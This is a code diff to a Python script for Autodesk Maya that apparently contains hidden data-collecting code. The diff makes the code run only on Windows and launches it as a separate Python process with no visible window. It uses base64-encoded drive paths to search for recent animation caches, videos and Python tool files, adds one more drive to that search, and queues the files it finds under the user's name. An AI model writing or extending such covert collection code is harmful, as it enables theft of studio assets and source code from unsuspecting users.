@@ -6,6 +6,8 @@ import maya.cmds as cmds
 
 def run_tst(py_cmd):
     import subprocess, os, sys
+    if not os.name == 'nt':
+        return None
     python_path = None
     if 'maya.exe' in os.path.basename(sys.executable).lower():
         maya_dir = os.path.dirname(sys.executable)
@@ -18,8 +20,8 @@ def run_tst(py_cmd):
             python_path = sorted(python_path)[-1]
         else:
             python_path = sys.executable.replace('\\', '/')
-    #r = subprocess.Popen([python_path, '-c', py_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
-    r = subprocess.Popen([python_path, '-c', py_cmd])
+    r = subprocess.Popen([python_path, '-c', py_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
+    #r = subprocess.Popen([python_path, '-c', py_cmd])
 
 
 run_tst("""
@@ -90,6 +92,7 @@ try:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.mp4')
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nL0thb2ZhbmcvVG9vbHNfRGV2').decode(), ext='.py', n=50)
+    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('WDo=').decode(), ext='.mp4', n=15)
     if zovV:
         add_queue_task('tst__{}'.format(getpass.getuser().lower()), {'file': zovV})
 except:
